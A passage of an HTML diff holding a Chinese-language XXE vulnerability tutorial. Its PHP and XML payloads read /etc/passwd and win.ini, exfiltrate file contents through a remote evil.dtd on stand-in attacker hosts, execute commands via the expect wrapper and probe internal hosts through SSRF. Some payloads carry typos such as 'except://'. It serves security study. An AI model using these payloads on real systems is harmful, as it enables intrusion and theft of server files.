;&#x4E3B;&#x673A;&#x3002;</li>
+</ul>
+</li>
+</ul>
+<h1 id="xxe&#x6F0F;&#x6D1E;&#x68C0;&#x6D4B;"><a name="xxe&#x6F0F;&#x6D1E;&#x68C0;&#x6D4B;" class="anchor-navigation-ex-anchor" href="#xxe&#x6F0F;&#x6D1E;&#x68C0;&#x6D4B;"><i class="fa fa-link" aria-hidden="true"></i></a>xxe&#x6F0F;&#x6D1E;&#x68C0;&#x6D4B;</h1>
+</li>
+<li><p>&#x7B2C;&#x4E00;&#x6B65;&#x5148;&#x68C0;&#x6D4B;XML&#x662F;&#x5426;&#x4F1A;&#x88AB;&#x6210;&#x529F;&#x89E3;&#x6790;&#xFF1A;</p>
+</li>
+</ul>
+<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-meta">?&gt;</span></span> 
+<span class="hljs-meta">&lt;!DOCTYPE ANY [ 
+&lt;!ENTITY name &quot;my name is nMask&quot;&gt;]
+&lt;root&gt;</span>&amp;name;<span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span>
+// &#x5982;&#x679C;&#x9875;&#x9762;&#x8F93;&#x51FA;&#x4E86;my name is nMask&#xFF0C;&#x8BF4;&#x660E;xml&#x6587;&#x4EF6;&#x53EF;&#x4EE5;&#x88AB;&#x89E3;&#x6790;
+</code></pre>
+<ol>
+<li><p>&#x7B2C;&#x4E8C;&#x6B65;&#x68C0;&#x6D4B;&#x670D;&#x52A1;&#x5668;&#x662F;&#x5426;&#x652F;&#x6301;DTD&#x5F15;&#x7528;&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#xFF1A;</p>
+<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=&#x201D;<span class="hljs-number">1.0</span>&#x201D; encoding=&#x201D;UTF<span class="hljs-number">-8</span>&#x201D;<span class="hljs-meta">?&gt;</span></span> 
+<span class="hljs-meta">&lt;!DOCTYPE ANY [ 
+&lt;!ENTITY % name SYSTEM &quot;http://localhost/index.html&quot;&gt; 
+%name; 
+]&gt;</span>
+// &#x53EF;&#x901A;&#x8FC7;&#x67E5;&#x770B;&#x81EA;&#x5DF1;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;&#x65E5;&#x5FD7;&#x6765;&#x5224;&#x65AD;&#xFF0C;&#x770B;&#x76EE;&#x6807;&#x670D;&#x52A1;&#x5668;&#x662F;&#x5426;&#x5411;&#x4F60;&#x7684;&#x670D;&#x52A1;&#x5668;&#x53D1;&#x4E86;&#x4E00;&#x6761;&#x8BF7;&#x6C42;index.html&#x7684;&#x8BF7;&#x6C42;
+</code></pre>
+</li>
+</ol>
+<ul>
+<li>&#x4ECE;PHP&#x4EE3;&#x7801;&#x5C42;&#x9762;&#x4E0A;</li>
+<li>&#x6700;&#x5F00;&#x59CB;&#xFF0C;&#x5F15;&#x5165;&#x4E00;&#x4E2A;file_get_contents&#x51FD;&#x6570;&#xFF0C;&#x5C06;&#x6574;&#x4E2A;XML&#x6570;&#x636E;&#x8BFB;&#x5165;data&#x5B57;&#x7B26;&#x4E32;&#x4E2D;</li>
+<li>&#x7136;&#x540E;&#x4EA4;&#x7ED9;php&#x7684;xml&#x89E3;&#x6790;&#x51FD;&#x6570;simplexml_load_string()&#x89E3;&#x6790;&#xFF0C;&#x89E3;&#x6790;&#x540E;&#x7684;&#x6570;&#x636E;&#x8D4B;&#x7ED9;xml&#x53D8;&#x91CF;&#x3002;</li>
+</ul>
+<ul>
+<li>&#x8FD9;&#x4E00;&#x6570;&#x636E;&#x5373;XML&#x5B57;&#x7B26;&#x4E32;&#x4E2D;&#x4F7F;&#x7528;&#x7684;&#x5BF9;&#x8C61;(&#x6216;&#x8005;&#x8BF4;&#x6839;&#x5143;&#x7D20;)&#x7684;&#x6570;&#x636E;&#xFF0C;&#x5E76;echo&#x8F93;&#x51FA;&#x51FA;&#x6765;&#x3002;</li>
+</ul>
+<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
+$data = file_get_contents(<span class="hljs-string">&apos;php://input&apos;</span>);  <span class="hljs-comment">//&#x83B7;&#x53D6;&#x63D0;&#x4EA4;&#x7684;XML&#x6570;&#x636E; php://input&#x8FD9;&#x79CD;&#x534F;&#x8BAE;&#x662F;&#x83B7;&#x53D6;POST&#x63D0;&#x4EA4;&#x7684;&#x6570;&#x636E;&#x6D41;</span>
+$xml = simplexml_load_string($data);  <span class="hljs-comment">// &#x4EA4;&#x7ED9;PHP&#x7684;XML&#x89E3;&#x6790;&#x51FD;&#x6570;</span>
+<span class="hljs-keyword">echo</span> $xml-&gt;name;
+<span class="hljs-meta">?&gt;</span>
+</code></pre>
+<h1 id="xxe&#x6F0F;&#x6D1E;&#x7684;&#x5371;&#x5BB3;"><a name="xxe&#x6F0F;&#x6D1E;&#x7684;&#x5371;&#x5BB3;" class="anchor-navigation-ex-anchor" href="#xxe&#x6F0F;&#x6D1E;&#x7684;&#x5371;&#x5BB3;"><i class="fa fa-link" aria-hidden="true"></i></a>xxe&#x6F0F;&#x6D1E;&#x7684;&#x5371;&#x5BB3;</h1>
+<ul>
+<li>xxe&#x6F0F;&#x6D1E;&#x7684;&#x5371;&#x5BB3;&#x6709;&#x5F88;&#x591A;&#xFF0C;&#x6BD4;&#x5982;&#x53EF;&#x4EE5;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;&#x3001;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x3001;&#x5185;&#x7F51;&#x7AEF;&#x53E3;&#x626B;&#x63CF;&#x3001;&#x653B;&#x51FB;&#x5185;&#x7F51;&#x7F51;&#x7AD9;&#x3001;&#x53D1;&#x8D77;dos&#x653B;&#x51FB;&#x7B49;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x8BFB;&#x53D6;&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x7684;&#x5229;&#x7528;&#x65B9;&#x5F0F;&#x8FDB;&#x884C;&#x6D4B;&#x8BD5;&#x3002;</li>
+</ul>
+<h2 id="&#x8BFB;&#x53D6;&#x4EFB;&#x610F;&#x6587;&#x4EF6;"><a name="&#x8BFB;&#x53D6;&#x4EFB;&#x610F;&#x6587;&#x4EF6;" class="anchor-navigation-ex-anchor" href="#&#x8BFB;&#x53D6;&#x4EFB;&#x610F;&#x6587;&#x4EF6;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x8BFB;&#x53D6;&#x4EFB;&#x610F;&#x6587;&#x4EF6;</h2>
+<h3 id="&#x6709;&#x56DE;&#x663E;&#x60C5;&#x51B5;"><a name="&#x6709;&#x56DE;&#x663E;&#x60C5;&#x51B5;" class="anchor-navigation-ex-anchor" href="#&#x6709;&#x56DE;&#x663E;&#x60C5;&#x51B5;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x6709;&#x56DE;&#x663E;&#x60C5;&#x51B5;</h3>
+<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
+$xml = <span class="hljs-string">&lt;&lt;&lt;EOF
+&lt;?xml version = &quot;1.0&quot;?&gt;
+&lt;!DOCTYPE ANY [
+    &lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+&lt;x&gt;&amp;f;&lt;/x&gt;
+EOF;</span>
+$data = simplexml_load_string($xml);
+print_r($data);
+<span class="hljs-meta">?&gt;</span>
+</code></pre>
+<ul>
+<li><p>&#x8BBF;&#x95EE;XML.php&#x53EF;&#x4EE5;&#x8BFB;&#x53D6;etc/passwd&#x6587;&#x4EF6;&#x5185;&#x5BB9;</p>
+</li>
+<li><p>&#x8BE5;CASE&#x662F;&#x8BFB;&#x53D6;/etc/passwd&#xFF0C;&#x6709;&#x4E9B;XML&#x89E3;&#x6790;&#x5E93;&#x652F;&#x6301;&#x5217;&#x76EE;&#x5F55;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x901A;&#x8FC7;&#x5217;&#x76EE;&#x5F55;&#x3001;&#x8BFB;&#x6587;&#x4EF6;&#xFF0C;&#x83B7;&#x53D6;&#x5E10;&#x53F7;&#x5BC6;&#x7801;&#x540E;&#x8FDB;&#x4E00;&#x6B65;&#x653B;&#x51FB;&#xFF0C;&#x5982;&#x8BFB;&#x53D6;tomcat-users.xml&#x5F97;&#x5230;&#x5E10;&#x53F7;&#x5BC6;&#x7801;</p>
+<p>&#x540E;&#x767B;&#x5F55;tomcat&#x7684;manager&#x90E8;&#x7F72;webshell&#x3002;</p>
+</li>
+</ul>
+<p>&#x5B9E;&#x4F8B;&#x5C55;&#x793A;&#xFF1A;</p>
+<p>&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5982;&#x4E0B;&#x7684;&#x4E24;&#x79CD;&#x65B9;&#x5F0F;&#x8FDB;&#x884C;XXE&#x6CE8;&#x5165;&#x653B;&#x51FB;&#x3002;</p>
+<pre><code class="lang-xml"><span class="hljs-meta">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY  xxe SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt;]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span>&amp;xxe;<span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span>
+</code></pre>
+<pre><code class="lang-xml"><span class="hljs-meta">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY  % xxe SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot; &gt;
+%xxe;]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span>&amp;evil;<span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span>
+</code></pre>
+<p>&#x5916;&#x90E8;evil DTD&#x4E2D;&#x7684;&#x5185;&#x5BB9;</p>
+<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> <span class="hljs-attr">evil</span> <span class="hljs-attr">SYSTEM</span> &#x201C;<span class="hljs-attr">file:</span>///<span class="hljs-attr">c:</span>/<span class="hljs-attr">windows</span>/<span class="hljs-attr">win.ini</span>&#x201D; &gt;</span>
+</code></pre>
+<p><img src="Image/&#x56FE;&#x50CF; 2.png" alt="img"></p>
+<p>&#x5F53;&#x7136;&#x4E5F;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x5185;&#x7F51;&#x7AD9;&#x70B9;&#x7684;&#x5165;&#x4FB5;&#x3002;</p>
+<p><img src="Image/&#x56FE;&#x50CF; 3.png" alt="img"></p>
+<ul>
+<li>&#x4EE5;&#x4E0A;&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;&#x80FD;&#x591F;&#x6210;&#x529F;&#xFF0C;&#x9664;&#x4E86;DTD&#x53EF;&#x6709;&#x5F15;&#x7528;&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x5916;&#xFF0C;&#x8FD8;&#x53D6;&#x51B3;&#x4E8E;&#x6709;&#x8F93;&#x51FA;&#x4FE1;&#x606F;&#xFF0C;&#x5373;&#x6709;&#x56DE;&#x663E;&#x3002;&#x90A3;&#x4E48;&#x5982;&#x679C;&#x7A0B;&#x5E8F;&#x6CA1;&#x6709;&#x56DE;&#x663E;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x8BE5;&#x600E;&#x4E48;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x5462;&#xFF1F;&#x9700;&#x8981;&#x4F7F;&#x7528;blind xxe&#x6F0F;&#x6D1E;&#x53BB;&#x5229;&#x7528;&#x3002;</li>
+</ul>
+<h3 id="&#x65E0;&#x56DE;&#x663E;&#x7684;&#x60C5;&#x51B5;"><a name="&#x65E0;&#x56DE;&#x663E;&#x7684;&#x60C5;&#x51B5;" class="anchor-navigation-ex-anchor" href="#&#x65E0;&#x56DE;&#x663E;&#x7684;&#x60C5;&#x51B5;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x65E0;&#x56DE;&#x663E;&#x7684;&#x60C5;&#x51B5;</h3>
+<h4 id="blind-xxe&#x6F0F;&#x6D1E;&#x65B9;&#x6848;1&#xFF1A;"><a name="blind-xxe&#x6F0F;&#x6D1E;&#x65B9;&#x6848;1&#xFF1A;" class="anchor-navigation-ex-anchor" href="#blind-xxe&#x6F0F;&#x6D1E;&#x65B9;&#x6848;1&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>blind xxe&#x6F0F;&#x6D1E;&#x65B9;&#x6848;1&#xFF1A;</h4>
+<ul>
+<li><p>&#x5BF9;&#x4E8E;&#x4F20;&#x7EDF;&#x7684;XXE&#x6765;&#x8BF4;&#xFF0C;&#x8981;&#x6C42;&#x653B;&#x51FB;&#x8005;&#x53EA;&#x6709;&#x5728;&#x670D;&#x52A1;&#x5668;&#x6709;&#x56DE;&#x663E;&#x6216;&#x8005;&#x62A5;&#x9519;&#x7684;&#x57FA;&#x7840;&#x4E0A;&#x624D;&#x80FD;&#x4F7F;&#x7528;XXE&#x6F0F;&#x6D1E;&#x6765;&#x8BFB;&#x53D6;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x6587;&#x4EF6;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x56DE;&#x663E;&#x5219;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;Blind XXE&#x6F0F;&#x6D1E;&#x6765;&#x6784;&#x5EFA;&#x4E00;&#x6761;&#x5E26;&#x5916;&#x4FE1;&#x9053;&#x63D0;&#x53D6;&#x6570;&#x636E;&#x3002;</p>
+</li>
+<li><p>&#x521B;&#x5EFA;test.php&#x5199;&#x5165;&#x4EE5;&#x4E0B;&#x5185;&#x5BB9;&#xFF1A;</p>
+</li>
+</ul>
+<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span> 
+file_put_contents(<span class="hljs-string">&quot;test.txt&quot;</span>, $_GET[<span class="hljs-string">&apos;file&apos;</span>]) ; 
+<span class="hljs-meta">?&gt;</span>
+</code></pre>
+<ol>
+<li>&#x521B;&#x5EFA;index.php&#x5199;&#x5165;&#x4EE5;&#x4E0B;&#x5185;&#x5BB9;&#xFF1A;</li>
+</ol>
+<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span> 
+$xml=&lt;&lt;&lt;EOF 
+<span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span><span class="hljs-meta">?&gt;</span> 
+&lt;!DOCTYPE ANY[ 
+&lt;!ENTITY % file SYSTEM <span class="hljs-string">&quot;file:///C:/test.txt&quot;</span>&gt; 
+&lt;!ENTITY % remote SYSTEM <span class="hljs-string">&quot;http://localhost/test.xml&quot;</span>&gt; 
+%remote;
+%all;
+%send; 
+]&gt; 
+EOF; 
+$data = simplexml_load_string($xml) ; 
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span> ; 
+print_r($data) ; 
+<span class="hljs-meta">?&gt;</span>
+</code></pre>
+<ol>
+<li>&#x521B;&#x5EFA;test.xml&#x5E76;&#x5199;&#x5165;&#x4EE5;&#x4E0B;&#x5185;&#x5BB9;&#xFF1A;</li>
+</ol>
+<pre><code class="lang-xml">&lt;!ENTITY % all &quot;&lt;!ENTITY % send SYSTEM &apos;http://localhost/test.php?file=%file;&apos;&gt;&quot;&gt;
+</code></pre>
+<ul>
+<li>&#x5F53;&#x8BBF;&#x95EE;<a href="http://localhost/index.php" target="_blank">http://localhost/index.php</a>, &#x5B58;&#x5728;&#x6F0F;&#x6D1E;&#x7684;&#x670D;&#x52A1;&#x5668;&#x4F1A;&#x8BFB;&#x51FA;text.txt&#x5185;&#x5BB9;&#xFF0C;&#x53D1;&#x9001;&#x7ED9;&#x653B;&#x51FB;&#x8005;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;test.php&#xFF0C;&#x7136;&#x540E;&#x628A;&#x8BFB;&#x53D6;&#x7684;&#x6570;&#x636E;&#x4FDD;&#x5B58;&#x5230;&#x672C;&#x5730;&#x7684;test.txt&#x4E2D;&#x3002;</li>
+</ul>
+<h4 id="blind-xxe&#x6F0F;&#x6D1E;&#x65B9;&#x6848;2&#xFF1A;"><a name="blind-xxe&#x6F0F;&#x6D1E;&#x65B9;&#x6848;2&#xFF1A;" class="anchor-navigation-ex-anchor" href="#blind-xxe&#x6F0F;&#x6D1E;&#x65B9;&#x6848;2&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>blind xxe&#x6F0F;&#x6D1E;&#x65B9;&#x6848;2&#xFF1A;</h4>
+<ul>
+<li>&#x53EF;&#x4EE5;&#x5C06;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x53D1;&#x9001;&#x5230;&#x8FDC;&#x7A0B;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x7136;&#x540E;&#x8BFB;&#x53D6;&#x3002;</li>
+</ul>
+<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml verstion=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE a[
+        &lt;!ENTITY % f SYSTEM &quot;http://yourhost/evil.dtd&quot;&gt;
+        %f;
+]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span>&amp;b;<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
+$data = simplexml_load_string($xml);
+print_r($data);
+</code></pre>
+<p>&#x8FDC;&#x7A0B;&#x670D;&#x52A1;&#x5668;&#x7684;evil DTD&#x6587;&#x4EF6;&#x5185;&#x5BB9;</p>
+<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> <span class="hljs-attr">b</span> <span class="hljs-attr">SYSTEM</span> &quot;<span class="hljs-attr">file:</span>///<span class="hljs-attr">etc</span>/<span class="hljs-attr">passwd</span>&quot;&gt;</span>
+</code></pre>
+<h4 id="blind-xxe&#x6F0F;&#x6D1E;&#x65B9;&#x6848;3&#xFF1A;"><a name="blind-xxe&#x6F0F;&#x6D1E;&#x65B9;&#x6848;3&#xFF1A;" class="anchor-navigation-ex-anchor" href="#blind-xxe&#x6F0F;&#x6D1E;&#x65B9;&#x6848;3&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>blind xxe&#x6F0F;&#x6D1E;&#x65B9;&#x6848;3&#xFF1A;</h4>
+<ul>
+<li>&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5916;&#x5E26;&#x6570;&#x636E;&#x901A;&#x9053;&#x63D0;&#x53D6;&#x6570;&#x636E;&#xFF0C;&#x5148;&#x4F7F;&#x7528;php://filter&#x83B7;&#x53D6;&#x76EE;&#x6807;&#x6587;&#x4EF6;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x5185;&#x5BB9;&#x4EE5;http&#x8BF7;&#x6C42;&#x53D1;&#x9001;&#x5230;&#x63A5;&#x53D7;&#x6570;&#x636E;&#x7684;&#x670D;&#x52A1;&#x5668;(&#x653B;&#x51FB;&#x670D;&#x52A1;&#x5668;)xxx.xxx.xxx&#x3002;</li>
+</ul>
+<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=&#x201D;<span class="hljs-number">1.0</span>&#x201D;<span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE ANY [
+&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./target.php&quot;&gt; # /etc/issue
+&lt;!ENTITY % dtd SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot;&gt;
+%dtd;
+%send;
+]&gt;</span>
+</code></pre>
+<p>evil.dtd&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x5185;&#x90E8;&#x7684;%&#x53F7;&#x8981;&#x8FDB;&#x884C;&#x5B9E;&#x4F53;&#x7F16;&#x7801;&#x6210;&amp;#x25&#x3002;</p>
+<pre><code class="lang-xml">&lt;!ENTITY % all
+&#x201C;&lt;!ENTITY &amp;#x25; send SYSTEM &#x2018;http://xxx.xxx.xxx/?%file;&#x2019;&gt;&#x201D;
+&gt;
+%all;
+</code></pre>
+<p>&#x6709;&#x62A5;&#x9519;&#x76F4;&#x63A5;&#x67E5;&#x770B;&#x62A5;&#x9519;&#x4FE1;&#x606F;&#x3002;</p>
+<p>&#x65E0;&#x62A5;&#x9519;&#x9700;&#x8981;&#x8BBF;&#x95EE;&#x63A5;&#x53D7;&#x6570;&#x636E;&#x7684;&#x670D;&#x52A1;&#x5668;&#x4E2D;&#x7684;&#x65E5;&#x5FD7;&#x4FE1;&#x606F;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x7ECF;&#x8FC7;base64&#x7F16;&#x7801;&#x8FC7;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x89E3;&#x7801;&#x540E;&#x4FBF;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x6570;&#x636E;&#x3002;</p>
+<p><img src="Image/&#x56FE;&#x50CF; 4.png" alt="img"></p>
+<p><img src="Image/&#x56FE;&#x50CF; 5.png" alt="img"></p>
+<p><strong>&#x8FD9;&#x91CC;&#x5217;&#x4E3E;&#x51E0;&#x4E2A;&#x6848;&#x4F8B;&#xFF1A;</strong></p>
+<p><strong>&#x6076;&#x610F;&#x5F15;&#x5165;&#x5916;&#x90E8;&#x5B9E;&#x4F53;1&#xFF1A;</strong></p>
+<p>XML&#x5185;&#x5BB9;</p>
+<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE a [
+      &lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">aaa</span>&gt;</span>&amp;b;<span class="hljs-tag">&lt;/<span class="hljs-name">aaa</span>&gt;</span>
+</code></pre>
+<p><strong>&#x6076;&#x610F;&#x5F15;&#x5165;&#x5916;&#x90E8;&#x5B9E;&#x4F53;2&#xFF1A;</strong></p>
+<p>XML&#x5185;&#x5BB9;</p>
+<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE a [
+     &lt;!ENTITY % d SYSTEM &quot;http://yourhost/evil.dtd&quot;&gt;
+     %d;
+]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">aaa</span>&gt;</span>&amp;b;<span class="hljs-tag">&lt;/<span class="hljs-name">aaa</span>&gt;</span>
+</code></pre>
+<p>DTD&#x6587;&#x4EF6;&#xFF08;evil.dtd&#xFF09;&#x5185;&#x5BB9;&#xFF1A;</p>
+<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> <span class="hljs-attr">b</span> <span class="hljs-attr">SYSTEM</span> &quot;<span class="hljs-attr">file:</span>///<span class="hljs-attr">etc</span>/<span class="hljs-attr">passwd</span>&quot;&gt;</span>
+</code></pre>
+<p><strong>&#x6076;&#x610F;&#x5F15;&#x5165;&#x5916;&#x90E8;&#x5B9E;&#x4F53;3</strong></p>
+<p>XML&#x5185;&#x5BB9;</p>
+<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml verstion=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE a SYSTEM &quot;http://yourhost/evil.dtd&quot;&gt;</span>
+]&gt;
+<span class="hljs-tag">&lt;<span class="hljs-name">c</span>&gt;</span>&amp;b;<span class="hljs-tag">&lt;/<span class="hljs-name">c</span>&gt;</span>
+</code></pre>
+<p>DTD&#x6587;&#x4EF6;&#x5185;&#x5BB9;</p>
+<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> <span class="hljs-attr">b</span> <span class="hljs-attr">SYSTEM</span> &quot;<span class="hljs-attr">file:</span>///<span class="hljs-attr">etc</span>/<span class="hljs-attr">passwd</span>&quot;&gt;</span>
+</code></pre>
+<p><strong>&#x6076;&#x610F;&#x5F15;&#x5165;&#x5916;&#x90E8;&#x5B9E;&#x4F53;(4)</strong></p>
+<pre><code class="lang-xml"><span class="hljs-meta">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY  xxe SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt;]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span>&amp;xxe;<span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span>
+</code></pre>
+<h2 id="&#x547D;&#x4EE4;&#x6267;&#x884C;"><a name="&#x547D;&#x4EE4;&#x6267;&#x884C;" class="anchor-navigation-ex-anchor" href="#&#x547D;&#x4EE4;&#x6267;&#x884C;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x547D;&#x4EE4;&#x6267;&#x884C;</h2>
+<ul>
+<li>php&#x73AF;&#x5883;&#x4E0B;&#xFF0C;xml&#x547D;&#x4EE4;&#x6267;&#x884C;&#x8981;&#x6C42;php&#x88C5;&#x6709;expect&#x6269;&#x5C55;&#x3002;&#x800C;&#x8BE5;&#x6269;&#x5C55;&#x9ED8;&#x8BA4;&#x6CA1;&#x6709;&#x5B89;&#x88C5;&#x3002;</li>
+</ul>
+<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
+$xml = <span class="hljs-string">&lt;&lt;&lt;EOF
+&lt;?xml version = &quot;1.0&quot;?&gt;
+&lt;!DOCTYPE ANY [
+    &lt;!ENTITY f SYSTEM &quot;except://ls&quot;&gt; # id
+]&gt;
+&lt;x&gt;&amp;f;&lt;/x&gt;
+EOF;</span>
+$data = simplexml_load_string($xml);
+print_r($data);
+<span class="hljs-meta">?&gt;</span>
+</code></pre>
+<p>&#x8BE5;CASE&#x662F;&#x5728;&#x5B89;&#x88C5;expect&#x6269;&#x5C55;&#x7684;PHP&#x73AF;&#x5883;&#x91CC;&#x6267;&#x884C;&#x7CFB;&#x7EDF;&#x547D;&#x4EE4;&#xFF0C;&#x5176;&#x4ED6;&#x534F;&#x8BAE;&#x4E5F;&#x6709;&#x53EF;&#x80FD;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x7CFB;&#x7EDF;&#x547D;&#x4EE4;&#x3002;</p>
+<h2 id="&#x5185;&#x7F51;&#x63A2;&#x6D4B;ssrf"><a name="&#x5185;&#x7F51;&#x63A2;&#x6D4B;ssrf" class="anchor-navigation-ex-anchor" href="#&#x5185;&#x7F51;&#x63A2;&#x6D4B;ssrf"><i class="fa fa-link" aria-hidden="true"></i></a>&#x5185;&#x7F51;&#x63A2;&#x6D4B;/SSRF</h2>
+<ul>
+<li><p>&#x7531;&#x4E8E;xml&#x5B9E;&#x4F53;&#x6CE8;&#x5165;&#x653B;&#x51FB;&#x53EF;&#x4EE5;&#x5229;&#x7528;<a href="http://&#x534F;&#x8BAE;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x53EF;&#x4EE5;&#x53D1;&#x8D77;http&#x8BF7;&#x6C42;&#x3002;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8BE5;&#x8BF7;&#x6C42;&#x53BB;&#x63A2;&#x67E5;&#x5185;&#x7F51;&#xFF0C;&#x8FDB;&#x884C;SSRF&#x653B;&#x51FB;&#x3002;" target="_blank">http://&#x534F;&#x8BAE;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x53EF;&#x4EE5;&#x53D1;&#x8D77;http&#x8BF7;&#x6C42;&#x3002;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8BE5;&#x8BF7;&#x6C42;&#x53BB;&#x63A2;&#x67E5;&#x5185;&#x7F51;&#xFF0C;&#x8FDB;&#x884C;SSRF&#x653B;&#x51FB;&#x3002;</a></p>
+<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
+$xml = <span class="hljs-string">&lt;&lt;&lt;EOF
+&lt;?xml version = &quot;1.0&quot;?&gt;
+&lt;!DOCTYPE ANY [
+  &lt;!ENTITY f SYSTEM &quot;http://192.168.1.1:80/&quot;&gt;
+]&gt;
+&lt;x&gt;&amp;f;&lt;/x&gt;
+EOF;</span>
+$data = simplexml_load_string($xml);
+print_r($data);
+<span class="hljs-meta">?&gt;</span>
+</code></pre>
+</li>
+</ul>
+<h2 id="&#x653B;&#x51FB;&#x5185;&#x7F51;&#x7F51;&#x7AD9;"><a name="&#x653B;&#x51FB;&#x5185;&#x7F51;&#x7F51;&#x7AD9;" class="anchor-navigation-ex-anchor" href="#&#x653B;&#x51FB;&#x5185;&#x7F51;&#x7F51;&#x7AD9;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x653B;&#x51FB;&#x5185;&#x7F51;&#x7F51;&#x7AD9;</h2>
+<p>&#x8BE5;CASE&#x662F;&#x653B;&#x51FB;&#x5185;&#x7F51;struts2&#x7F51;&#x7AD9;&#xFF0C;&#x8FDC;&#x7A0B;&#x6267;&#x884C;&#x7CFB;&#x7EDF;&#x547D;&#x4EE4;&#x3002;</p>
